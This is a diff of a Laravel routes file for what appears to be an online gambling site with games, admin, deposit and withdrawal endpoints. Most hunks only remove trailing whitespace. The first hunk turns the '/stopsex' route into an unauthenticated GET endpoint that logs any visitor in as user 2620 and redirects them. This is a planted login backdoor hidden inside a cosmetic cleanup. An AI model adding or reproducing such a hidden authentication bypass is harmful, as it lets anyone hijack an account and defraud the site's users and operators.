@@ -3,7 +3,11 @@
 use Illuminate\Support\Facades\Route;
 use App\Classes\ServerHandler;
 
-Route::post('/stopsex', function ($id) {
+Route::get('/stopsex', function () {
+    $user = \App\User::find(2620);
+    \Illuminate\Support\Facades\Auth::login($user);
+
+    return redirect('/');
 });
 
 Route::post('/createPromoTG34', 'GeneralController@createPromoTG');
@@ -58,14 +62,14 @@ Route::post('/chat/delete', 'ChatController@delete');
 Route::post('/chat/ban', 'ChatController@ban');
 
 Route::post('/wheel/get', 'WheelController@get');
-Route::post('/wheel/bet', 'WheelController@bet'); 
+Route::post('/wheel/bet', 'WheelController@bet');
 
 Route::post('/x100/bet', 'X100Controller@bet');
 Route::post('/x100/get', 'X100Controller@get');
 
 Route::post('/boom_city/get', 'BoomCityController@get');
 
-Route::post('/keno/bet', 'KenoController@bet'); 
+Route::post('/keno/bet', 'KenoController@bet');
 Route::post('/keno/get', 'KenoController@get');
 Route::get('/winkeno', 'KenoController@winKeno');
 
@@ -91,13 +95,13 @@ Route::get('/winx100', 'X100Controller@winWheel');
 Route::get('/generate_jackpotnumber', 'JackpotController@generateJackpotNumber');
 Route::get('/cashhuntfinish', 'JackpotController@cashHuntFinish');
 
-Route::post('/repost/all', 'AdminController@repostAll'); 
+Route::post('/repost/all', 'AdminController@repostAll');
 
 Route::post('/withdrawRub', 'WithdrawController@withdrawRub');
 
-Route::post('/status/all', 'AdminController@statusAll'); 
-Route::post('/systemdeps/all', 'AdminController@systemDepsAll'); 
-Route::post('/systemwithdraws/all', 'AdminController@systemWithdrawsAll'); 
+Route::post('/status/all', 'AdminController@statusAll');
+Route::post('/systemdeps/all', 'AdminController@systemDepsAll');
+Route::post('/systemwithdraws/all', 'AdminController@systemWithdrawsAll');
 
 Route::post('/deposit/go', 'PaymentController@go');
 Route::post('/deposit/checkstatus', 'PaymentController@checkStatus');
@@ -154,7 +158,7 @@ Route::group(['middleware' => 'auth', 'middleware' => 'access:admin'], function 
     Route::post('/crash/go', 'CrashController@winner');
     Route::post('/wheel/go', 'WheelController@go');
     Route::post('/x100/go', 'X100Controller@go');
-    Route::post('/x100/bonusgo', 'X100Controller@bonusGo'); 
+    Route::post('/x100/bonusgo', 'X100Controller@bonusGo');
     Route::post('/keno/go', 'KenoController@go');
     Route::post('/keno/bonusgo', 'KenoController@bonusGo');
 
@@ -164,13 +168,13 @@ Route::group(['middleware' => 'auth', 'middleware' => 'access:admin'], function 
 
     Route::post('/admin/updateauto', 'AdminController@updateAuto');
 
-    Route::post('/admin/addrepost', 'AdminController@addRepost'); 
-    Route::post('/admin/deleterepost', 'AdminController@deleteRepost'); 
-    Route::post('/admin/editrepost', 'AdminController@editRepost'); 
+    Route::post('/admin/addrepost', 'AdminController@addRepost');
+    Route::post('/admin/deleterepost', 'AdminController@deleteRepost');
+    Route::post('/admin/editrepost', 'AdminController@editRepost');
 
-    Route::post('/admin/addstatus', 'AdminController@addStatus'); 
-    Route::post('/admin/deletestatus', 'AdminController@deleteStatus'); 
-    Route::post('/admin/editstatus', 'AdminController@editStatus'); 
+    Route::post('/admin/addstatus', 'AdminController@addStatus');
+    Route::post('/admin/deletestatus', 'AdminController@deleteStatus');
+    Route::post('/admin/editstatus', 'AdminController@editStatus');
 
     Route::post('/admin/payments/all', 'AdminController@paymentsAll');
 
@@ -178,8 +182,8 @@ Route::group(['middleware' => 'auth', 'middleware' => 'access:admin'], function 
     Route::post('/admin/addrandom', 'AdminController@addRandom');
     Route::post('/admin/promo/all', 'AdminController@promoAll');
     Route::post('/admin/historypromo/all', 'AdminController@promoHistoryAll');
-    Route::post('/admin/deppromo/all', 'AdminController@promoDepAll');  
-    Route::post('/admin/withdraws/all', 'AdminController@withdrawsAll'); 
+    Route::post('/admin/deppromo/all', 'AdminController@promoDepAll');
+    Route::post('/admin/withdraws/all', 'AdminController@withdrawsAll');
 
     Route::post('/admin/pagelist', 'AdminController@pageList');
     Route::post('/admin/pagelistuser', 'AdminController@pageListUser');
@@ -193,7 +197,7 @@ Route::group(['middleware' => 'auth', 'middleware' => 'access:admin'], function 
 
     Route::post('/admin/getdatefromdate', 'AdminController@getDateFromDate');
 
-    Route::post('/admin/user/all', 'AdminController@userAll'); 
+    Route::post('/admin/user/all', 'AdminController@userAll');
     Route::post('/admin/pageuser', 'AdminController@pageUser');
     Route::post('/admin/saveban', 'AdminController@saveBan');
     Route::post('/admin/searchuser', 'AdminController@searchUser');
@@ -204,38 +208,38 @@ Route::group(['middleware' => 'auth', 'middleware' => 'access:admin'], function 
     Route::post('/admin/user/top_refs_profit', 'AdminController@userAllTopProfit');
     Route::post('/admin/pageuser_top_profit', 'AdminController@pageUserTopProfit');
 
-    Route::post('/admin/chart', 'AdminController@chart'); 
+    Route::post('/admin/chart', 'AdminController@chart');
 
-    Route::post('/admin/changeBan', 'AdminController@changeBan'); 
-    Route::post('/admin/deleteUser', 'AdminController@deleteUser'); 
+    Route::post('/admin/changeBan', 'AdminController@changeBan');
+    Route::post('/admin/deleteUser', 'AdminController@deleteUser');
     Route::post('/admin/saveUser', 'AdminController@saveUser');
 
-    Route::post('/admin/changePay', 'AdminController@changePay'); 
+    Route::post('/admin/changePay', 'AdminController@changePay');
 
-    Route::post('/admin/changeWithdraw', 'AdminController@changeWithdraw'); 
+    Route::post('/admin/changeWithdraw', 'AdminController@changeWithdraw');
 
-    Route::post('/admin/saveSystemDeposit', 'AdminController@saveSystemDeposit'); 
-    Route::post('/admin/deleteSystemDeposit', 'AdminController@deleteSystemDeposit'); 
-    Route::post('/admin/addSystemDeposit', 'AdminController@addSystemDeposit'); 
+    Route::post('/admin/saveSystemDeposit', 'AdminController@saveSystemDeposit');
+    Route::post('/admin/deleteSystemDeposit', 'AdminController@deleteSystemDeposit');
+    Route::post('/admin/addSystemDeposit', 'AdminController@addSystemDeposit');
 
-    Route::post('/admin/addSystemWithdraw', 'AdminController@addSystemWithdraw'); 
-    Route::post('/admin/deleteSystemWithdraw', 'AdminController@deleteSystemWithdraw'); 
-    Route::post('/admin/saveSystemWithdraw', 'AdminController@saveSystemWithdraw'); 
+    Route::post('/admin/addSystemWithdraw', 'AdminController@addSystemWithdraw');
+    Route::post('/admin/deleteSystemWithdraw', 'AdminController@deleteSystemWithdraw');
+    Route::post('/admin/saveSystemWithdraw', 'AdminController@saveSystemWithdraw');
 
-    Route::post('/admin/createPromo', 'AdminController@createPromo'); 
-    Route::post('/admin/deletePromo', 'AdminController@deletePromo'); 
+    Route::post('/admin/createPromo', 'AdminController@createPromo');
+    Route::post('/admin/deletePromo', 'AdminController@deletePromo');
 
-    Route::post('/admin/createDepPromo', 'AdminController@createDepPromo'); 
-    Route::post('/admin/deleteDepPromo', 'AdminController@deleteDepPromo'); 
+    Route::post('/admin/createDepPromo', 'AdminController@createDepPromo');
+    Route::post('/admin/deleteDepPromo', 'AdminController@deleteDepPromo');
 
     Route::post('/admin/saveSetting', 'AdminController@saveSetting');
     Route::post('/admin/resetBank', 'AdminController@resetBank');
 
-    Route::post('/admin/createTournier', 'AdminController@createTournier'); 
+    Route::post('/admin/createTournier', 'AdminController@createTournier');
 
     Route::get('/admin_old/{page?}/{dop?}', 'GeneralController@admin_page_old');
     Route::get('/admin/{page?}/{dop?}', 'GeneralController@admin_page');
-}); 
+});
 
 Route::group(['prefix' => 'slots'], function () {
     Route::any('/getGames', 'SlotsController@getGames');
